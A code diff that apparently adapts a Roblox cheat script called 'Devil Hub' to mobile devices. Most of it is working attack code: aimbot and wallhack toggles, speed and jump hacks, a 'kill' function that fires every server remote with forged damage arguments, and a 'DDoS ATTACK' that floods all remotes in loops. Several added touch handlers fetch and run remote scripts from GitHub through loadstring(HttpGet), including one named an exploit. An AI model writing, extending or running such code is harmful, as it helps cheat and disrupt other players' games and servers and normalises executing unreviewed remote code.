@@ -21,19 +21,27 @@ local mouse = player:GetMouse()
 local runService = game:GetService("RunService")
 local userInputService = game:GetService("UserInputService")
 
+local isMobile = userInputService.TouchEnabled and not userInputService.KeyboardEnabled
+
 ScreenGui.Name = "DEVILHUB"
 ScreenGui.Parent = game.CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 
+local guiWidth = isMobile and 350 or 450
+local guiHeight = isMobile and 600 or 700
+local buttonHeight = isMobile and 65 or 55
+local fontSize = isMobile and 18 or 20
+local titleSize = isMobile and 22 or 24
+
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
 MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(0.5, -250, 0.5, -380)
-MainFrame.Size = UDim2.new(0, 450, 0, 700)
+MainFrame.Position = UDim2.new(0.5, -guiWidth/2, 0.5, -guiHeight/2)
+MainFrame.Size = UDim2.new(0, guiWidth, 0, guiHeight)
 MainFrame.Active = true
-MainFrame.Draggable = true
+MainFrame.Draggable = not isMobile
 MainFrame.ClipsDescendants = true
 
 local Corner = Instance.new("UICorner")
@@ -56,11 +64,11 @@ Title.Name = "Title"
 Title.Parent = MainFrame
 Title.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
 Title.BorderSizePixel = 0
-Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Size = UDim2.new(1, 0, 0, isMobile and 45 or 50)
 Title.Font = Enum.Font.GothamBold
 Title.Text = "DEVIL HUB V1"
 Title.TextColor3 = Color3.fromRGB(200, 150, 255)
-Title.TextSize = 24
+Title.TextSize = titleSize
 Title.BackgroundTransparency = 0.2
 
 local TitleGradient = Instance.new("UIGradient")
@@ -79,12 +87,12 @@ CloseButton.Name = "CloseButton"
 CloseButton.Parent = MainFrame
 CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
 CloseButton.BorderSizePixel = 0
-CloseButton.Position = UDim2.new(1, -45, 0, 10)
-CloseButton.Size = UDim2.new(0, 35, 0, 35)
+CloseButton.Position = UDim2.new(1, -(isMobile and 40 or 45), 0, isMobile and 8 or 10)
+CloseButton.Size = UDim2.new(0, isMobile and 32 or 35, 0, isMobile and 32 or 35)
 CloseButton.Font = Enum.Font.GothamBold
 CloseButton.Text = "X"
 CloseButton.TextColor3 = Color3.fromRGB(255, 200, 255)
-CloseButton.TextSize = 20
+CloseButton.TextSize = isMobile and 18 or 20
 CloseButton.AutoButtonColor = false
 
 local CloseCorner = Instance.new("UICorner")
@@ -96,23 +104,32 @@ CloseButton.MouseButton1Click:Connect(function()
 end)
 
 CloseButton.MouseEnter:Connect(function()
-    CloseButton.BackgroundColor3 = Color3.fromRGB(180, 0, 90)
+    if not isMobile then
+        CloseButton.BackgroundColor3 = Color3.fromRGB(180, 0, 90)
+    end
 end)
 
 CloseButton.MouseLeave:Connect(function()
-    CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
+    if not isMobile then
+        CloseButton.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
+    end
+end)
+
+CloseButton.TouchTap:Connect(function()
+    ScreenGui:Destroy()
 end)
 
 ScrollFrame.Name = "ScrollFrame"
 ScrollFrame.Parent = MainFrame
 ScrollFrame.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
 ScrollFrame.BorderSizePixel = 0
-ScrollFrame.Position = UDim2.new(0, 15, 0, 65)
-ScrollFrame.Size = UDim2.new(1, -30, 1, -170)
+ScrollFrame.Position = UDim2.new(0, 10, 0, isMobile and 55 or 65)
+ScrollFrame.Size = UDim2.new(1, -20, 1, -(isMobile and 140 or 170))
 ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-ScrollFrame.ScrollBarThickness = 8
+ScrollFrame.ScrollBarThickness = isMobile and 4 or 8
 ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(140, 0, 255)
 ScrollFrame.BackgroundTransparency = 0.3
+ScrollFrame.ScrollingEnabled = true
 
 local ScrollCorner = Instance.new("UICorner")
 ScrollCorner.CornerRadius = UDim.new(0, 10)
@@ -120,14 +137,14 @@ ScrollCorner.Parent = ScrollFrame
 
 UIListLayout.Parent = ScrollFrame
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-UIListLayout.Padding = UDim.new(0, 12)
+UIListLayout.Padding = UDim.new(0, isMobile and 8 or 12)
 UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 local AimbotRadiusFrame = Instance.new("Frame")
 AimbotRadiusFrame.Parent = ScrollFrame
 AimbotRadiusFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 40)
 AimbotRadiusFrame.BorderSizePixel = 0
-AimbotRadiusFrame.Size = UDim2.new(1, -20, 0, 60)
+AimbotRadiusFrame.Size = UDim2.new(1, -20, 0, isMobile and 70 or 60)
 AimbotRadiusFrame.BackgroundTransparency = 0.2
 
 local RadiusCorner = Instance.new("UICorner")
@@ -142,7 +159,7 @@ RadiusLabel.Position = UDim2.new(0, 10, 0, 5)
 RadiusLabel.Font = Enum.Font.Gotham
 RadiusLabel.Text = "Aimbot Circle Size"
 RadiusLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
-RadiusLabel.TextSize = 14
+RadiusLabel.TextSize = isMobile and 13 or 14
 RadiusLabel.TextXAlignment = Enum.TextXAlignment.Left
 
 local RadiusValue = Instance.new("TextLabel")
@@ -153,14 +170,14 @@ RadiusValue.Position = UDim2.new(1, -60, 0, 5)
 RadiusValue.Font = Enum.Font.GothamBold
 RadiusValue.Text = "150"
 RadiusValue.TextColor3 = Color3.fromRGB(255, 255, 255)
-RadiusValue.TextSize = 14
+RadiusValue.TextSize = isMobile and 13 or 14
 
 local RadiusSlider = Instance.new("Frame")
 RadiusSlider.Parent = AimbotRadiusFrame
 RadiusSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
 RadiusSlider.BorderSizePixel = 0
 RadiusSlider.Position = UDim2.new(0, 10, 0, 35)
-RadiusSlider.Size = UDim2.new(1, -20, 0, 15)
+RadiusSlider.Size = UDim2.new(1, -20, 0, isMobile and 25 or 15)
 
 local SliderCorner = Instance.new("UICorner")
 SliderCorner.CornerRadius = UDim.new(1, 0)
@@ -172,7 +189,7 @@ SliderButton.Parent = RadiusSlider
 SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 SliderButton.BorderSizePixel = 0
 SliderButton.Position = UDim2.new(0, 0, 0, 0)
-SliderButton.Size = UDim2.new(0, 20, 1, 0)
+SliderButton.Size = UDim2.new(0, isMobile and 30 or 20, 1, 0)
 SliderButton.Text = ""
 
 local SliderButtonCorner = Instance.new("UICorner")
@@ -185,24 +202,26 @@ local function createButton(name)
     button.Parent = ScrollFrame
     button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     button.BorderSizePixel = 0
-    button.Size = UDim2.new(1, -20, 0, 55)
+    button.Size = UDim2.new(1, -20, 0, buttonHeight)
     button.Font = Enum.Font.GothamBold
     button.Text = name
     button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.TextSize = 20
+    button.TextSize = fontSize
     button.AutoButtonColor = false
     
     local btnCorner = Instance.new("UICorner")
     btnCorner.CornerRadius = UDim.new(0, 10)
     btnCorner.Parent = button
     
-    button.MouseEnter:Connect(function()
-        button:TweenSize(UDim2.new(1, -15, 0, 60), "Out", "Quad", 0.2)
-    end)
-    
-    button.MouseLeave:Connect(function()
-        button:TweenSize(UDim2.new(1, -20, 0, 55), "Out", "Quad", 0.2)
-    end)
+    if not isMobile then
+        button.MouseEnter:Connect(function()
+            button:TweenSize(UDim2.new(1, -15, 0, buttonHeight + 5), "Out", "Quad", 0.2)
+        end)
+        
+        button.MouseLeave:Connect(function()
+            button:TweenSize(UDim2.new(1, -20, 0, buttonHeight), "Out", "Quad", 0.2)
+        end)
+    end
     
     return button
 end
@@ -219,12 +238,12 @@ DDoSButton = createButton("DDoS ATTACK")
 StatusLabel.Parent = MainFrame
 StatusLabel.BackgroundColor3 = Color3.fromRGB(30, 0, 45)
 StatusLabel.BorderSizePixel = 0
-StatusLabel.Position = UDim2.new(0, 15, 1, -70)
-StatusLabel.Size = UDim2.new(1, -30, 0, 55)
+StatusLabel.Position = UDim2.new(0, 10, 1, -(isMobile and 65 or 70))
+StatusLabel.Size = UDim2.new(1, -20, 0, isMobile and 50 or 55)
 StatusLabel.Font = Enum.Font.Gotham
 StatusLabel.Text = "Status: Devil Ready"
 StatusLabel.TextColor3 = Color3.fromRGB(200, 150, 255)
-StatusLabel.TextSize = 16
+StatusLabel.TextSize = isMobile and 14 or 16
 StatusLabel.BackgroundTransparency = 0.3
 
 local StatusCorner = Instance.new("UICorner")
@@ -289,14 +308,18 @@ local function updateAimbotRadius(newRadius)
     end
 end
 
+local function handleSliderInput(input)
+    local pos = math.clamp((input.Position.X - RadiusSlider.AbsolutePosition.X) / RadiusSlider.AbsoluteSize.X, 0, 1)
+    SliderButton.Position = UDim2.new(pos, 0, 0, 0)
+    local newRadius = 50 + (pos * 450)
+    updateAimbotRadius(newRadius)
+end
+
 SliderButton.MouseButton1Down:Connect(function()
     local connection
     connection = userInputService.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement then
-            local pos = math.clamp((input.Position.X - RadiusSlider.AbsolutePosition.X) / RadiusSlider.AbsoluteSize.X, 0, 1)
-            SliderButton.Position = UDim2.new(pos, 0, 0, 0)
-            local newRadius = 50 + (pos * 450)
-            updateAimbotRadius(newRadius)
+            handleSliderInput(input)
         end
     end)
     
@@ -306,6 +329,14 @@ SliderButton.MouseButton1Down:Connect(function()
         end
     end)
 end)
+
+if isMobile then
+    SliderButton.TouchTap:Connect(function()
+    end)
+    
+    SliderButton.TouchLongPress:Connect(function()
+    end)
+end
 
 local function getTeamColor(targetPlayer)
     if not targetPlayer or not targetPlayer.Character then return Color3.fromRGB(255, 0, 0) end
@@ -490,12 +521,15 @@ local function showPlayerList(callback)
     listGui.Parent = game.CoreGui
     listGui.Name = "DevilList"
     
+    local listWidth = isMobile and 300 or 400
+    local listHeight = isMobile and 450 or 500
+    
     local listFrame = Instance.new("Frame")
     listFrame.Parent = listGui
     listFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
     listFrame.BorderSizePixel = 0
-    listFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
-    listFrame.Size = UDim2.new(0, 400, 0, 500)
+    listFrame.Position = UDim2.new(0.5, -listWidth/2, 0.5, -listHeight/2)
+    listFrame.Size = UDim2.new(0, listWidth, 0, listHeight)
     listFrame.Active = true
     
     local listCorner = Instance.new("UICorner")
@@ -506,22 +540,22 @@ local function showPlayerList(callback)
     listTitle.Parent = listFrame
     listTitle.BackgroundColor3 = Color3.fromRGB(45, 0, 75)
     listTitle.BorderSizePixel = 0
-    listTitle.Size = UDim2.new(1, 0, 0, 50)
+    listTitle.Size = UDim2.new(1, 0, 0, isMobile and 45 or 50)
     listTitle.Font = Enum.Font.GothamBold
     listTitle.Text = "Select Target"
     listTitle.TextColor3 = Color3.fromRGB(200, 150, 255)
-    listTitle.TextSize = 22
+    listTitle.TextSize = isMobile and 20 or 22
     
     local listClose = Instance.new("TextButton")
     listClose.Parent = listFrame
     listClose.BackgroundColor3 = Color3.fromRGB(140, 0, 70)
     listClose.BorderSizePixel = 0
-    listClose.Position = UDim2.new(1, -45, 0, 10)
-    listClose.Size = UDim2.new(0, 35, 0, 35)
+    listClose.Position = UDim2.new(1, -(isMobile and 40 or 45), 0, isMobile and 8 or 10)
+    listClose.Size = UDim2.new(0, isMobile and 32 or 35, 0, isMobile and 32 or 35)
     listClose.Font = Enum.Font.GothamBold
     listClose.Text = "X"
     listClose.TextColor3 = Color3.fromRGB(255, 200, 255)
-    listClose.TextSize = 20
+    listClose.TextSize = isMobile and 18 or 20
     
     local listCloseCorner = Instance.new("UICorner")
     listCloseCorner.CornerRadius = UDim.new(0, 8)
@@ -531,20 +565,26 @@ local function showPlayerList(callback)
         listGui:Destroy()
     end)
     
+    if isMobile then
+        listClose.TouchTap:Connect(function()
+            listGui:Destroy()
+        end)
+    end
+    
     local listScroll = Instance.new("ScrollingFrame")
     listScroll.Parent = listFrame
     listScroll.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
     listScroll.BorderSizePixel = 0
-    listScroll.Position = UDim2.new(0, 15, 0, 65)
-    listScroll.Size = UDim2.new(1, -30, 1, -90)
+    listScroll.Position = UDim2.new(0, 10, 0, isMobile and 55 or 65)
+    listScroll.Size = UDim2.new(1, -20, 1, -(isMobile and 80 or 90))
     listScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-    listScroll.ScrollBarThickness = 8
+    listScroll.ScrollBarThickness = isMobile and 4 or 8
     listScroll.ScrollBarImageColor3 = Color3.fromRGB(140, 0, 255)
     
     local listLayout = Instance.new("UIListLayout")
     listLayout.Parent = listScroll
     listLayout.SortOrder = Enum.SortOrder.Name
-    listLayout.Padding = UDim.new(0, 8)
+    listLayout.Padding = UDim.new(0, isMobile and 6 or 8)
     listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
     
     for _, otherPlayer in pairs(game.Players:GetPlayers()) do
@@ -553,11 +593,11 @@ local function showPlayerList(callback)
             playerButton.Parent = listScroll
             playerButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
             playerButton.BorderSizePixel = 0
-            playerButton.Size = UDim2.new(1, -20, 0, 45)
+            playerButton.Size = UDim2.new(1, -20, 0, isMobile and 50 or 45)
             playerButton.Font = Enum.Font.Gotham
             playerButton.Text = otherPlayer.Name
             playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-            playerButton.TextSize = 18
+            playerButton.TextSize = isMobile and 16 or 18
             
             local btnCorner = Instance.new("UICorner")
             btnCorner.CornerRadius = UDim.new(0, 8)
@@ -567,6 +607,13 @@ local function showPlayerList(callback)
                 callback(otherPlayer)
                 listGui:Destroy()
             end)
+            
+            if isMobile then
+                playerButton.TouchTap:Connect(function()
+                    callback(otherPlayer)
+                    listGui:Destroy()
+                end)
+            end
         end
     end
     
@@ -575,25 +622,43 @@ local function showPlayerList(callback)
     end)
 end
 
-local function findDamageRemote()
-    local remote = nil
-    local potentialRemotes = {}
-    
+local allRemotes = {}
+
+local function findAllRemotes()
+    allRemotes = {}
     for _, obj in pairs(game:GetDescendants()) do
         if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            local name = obj.Name:lower()
-            if name:find("damage") or name:find("hit") or name:find("take") or name:find("kill") or name:find("attack") or name:find("bullet") then
-                table.insert(potentialRemotes, obj)
-            end
+            table.insert(allRemotes, obj)
         end
     end
+    return allRemotes
+end
+
+local function tryKillWithRemote(targetPlayer, remote)
+    if not remote or not remote.Parent then return false end
     
-    if #potentialRemotes > 0 then
-        remote = potentialRemotes[1]
-        updateStatus("Remote found: " .. remote.Name)
-    end
+    local args = {
+        [1] = targetPlayer,
+        [2] = targetPlayer.Character.Humanoid,
+        [3] = 9999,
+        [4] = player.Character.HumanoidRootPart.Position,
+        [5] = targetPlayer.Character.HumanoidRootPart.Position,
+        [6] = "damage",
+        [7] = workspace,
+        [8] = Vector3.new(0,0,0),
+        [9] = 100,
+        [10] = true
+    }
     
-    return remote
+    local success = pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(unpack(args))
+        else
+            remote:InvokeServer(unpack(args))
+        end
+    end)
+    
+    return success
 end
 
 local function killPlayer(targetPlayer)
@@ -602,22 +667,26 @@ local function killPlayer(targetPlayer)
         return
     end
     
-    local remote = findDamageRemote()
+    local remotes = findAllRemotes()
+    updateStatus("Testing " .. #remotes .. " remotes...")
     
-    if remote then
-        local args = {
-            [1] = targetPlayer,
-            [2] = targetPlayer.Character.Humanoid,
-            [3] = 9999,
-            [4] = player.Character.HumanoidRootPart.Position
-        }
-        
-        pcall(function()
-            remote:FireServer(unpack(args))
-        end)
-        
-        updateStatus(targetPlayer.Name .. " killed (remote)")
-    else
+    local killed = false
+    
+    for i, remote in ipairs(remotes) do
+        if remote and remote.Parent then
+            local success = tryKillWithRemote(targetPlayer, remote)
+            if success then
+                killed = true
+                updateStatus(targetPlayer.Name .. " killed with: " .. remote.Name)
+                break
+            end
+        end
+        if i % 10 == 0 then
+            task.wait(0.05)
+        end
+    end
+    
+    if not killed then
         local character = targetPlayer.Character
         local humanoid = character:FindFirstChild("Humanoid")
         
@@ -657,20 +726,18 @@ local function startDDoS()
     DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
     updateStatus("DDoS started")
     
-    local remotes = {}
-    for _, obj in pairs(game:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(remotes, obj)
-        end
-    end
-    
+    local remotes = findAllRemotes()
     updateStatus(#remotes .. " remotes found, attacking...")
     
     local function attackRemote(remote)
         while ddosActive and remote and remote.Parent do
             local success = pcall(function()
-                for i = 1, 100 do
-                    remote:FireServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
+                for i = 1, 50 do
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
+                    else
+                        remote:InvokeServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
+                    end
                 end
             end)
             if not success then
@@ -689,11 +756,14 @@ local function startDDoS()
     
     task.spawn(function()
         while ddosActive do
-            for i = 1, 10 do
-                local newRemote = findDamageRemote()
-                if newRemote then
+            local newRemotes = findAllRemotes()
+            for i, remote in ipairs(newRemotes) do
+                local alreadyRunning = false
+                for _, thread in pairs(ddosThreads) do
+                end
+                if not alreadyRunning then
                     local thread = task.spawn(function()
-                        attackRemote(newRemote)
+                        attackRemote(remote)
                     end)
                     table.insert(ddosThreads, thread)
                 end
@@ -742,6 +812,94 @@ JumpButton.MouseButton1Click:Connect(function()
         end
     end
 end)
+
+if isMobile then
+    SpeedButton.TouchTap:Connect(function()
+        speedEnabled = not speedEnabled
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChild("Humanoid")
+            if humanoid then
+                if speedEnabled then
+                    originalSpeed = humanoid.WalkSpeed
+                    humanoid.WalkSpeed = currentSpeed
+                    SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                    updateStatus("Speed Active (120)")
+                else
+                    humanoid.WalkSpeed = 16
+                    SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                    updateStatus("Speed Disabled")
+                end
+            end
+        end
+    end)
+    
+    JumpButton.TouchTap:Connect(function()
+        jumpEnabled = not jumpEnabled
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChild("Humanoid")
+            if humanoid then
+                if jumpEnabled then
+                    originalJump = humanoid.JumpPower
+                    humanoid.JumpPower = currentJump
+                    JumpButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+                    updateStatus("Jump Active (250)")
+                else
+                    humanoid.JumpPower = 50
+                    JumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                    updateStatus("Jump Disabled")
+                end
+            end
+        end
+    end)
+    
+    KillButton.TouchTap:Connect(function()
+        showPlayerList(function(selected)
+            killPlayer(selected)
+        end)
+    end)
+    
+    FlingButton.TouchTap:Connect(function()
+        updateStatus("Loading Fling...")
+        local success = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
+        end)
+        if success then
+            updateStatus("Fling loaded")
+        else
+            updateStatus("Fling failed to load", true)
+        end
+    end)
+    
+    WallhackButton.TouchTap:Connect(function()
+        wallhackEnabled = not wallhackEnabled
+        toggleWallhack(wallhackEnabled)
+        WallhackButton.BackgroundColor3 = wallhackEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
+    end)
+    
+    AimbotButton.TouchTap:Connect(function()
+        aimbotEnabled = not aimbotEnabled
+        toggleAimbot(aimbotEnabled)
+        AimbotButton.BackgroundColor3 = aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
+    end)
+    
+    AC6Button.TouchTap:Connect(function()
+        updateStatus("Loading AC6 Sound...")
+        local success = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/Ac6ExploitSource.luau"))()
+        end)
+        if success then
+            updateStatus("AC6 Sound loaded")
+        else
+            updateStatus("AC6 Sound failed to load", true)
+        end
+    end)
+    
+    DDoSButton.TouchTap:Connect(function()
+        startDDoS()
+    end)
+end
 
 KillButton.MouseButton1Click:Connect(function()
     showPlayerList(function(selected)
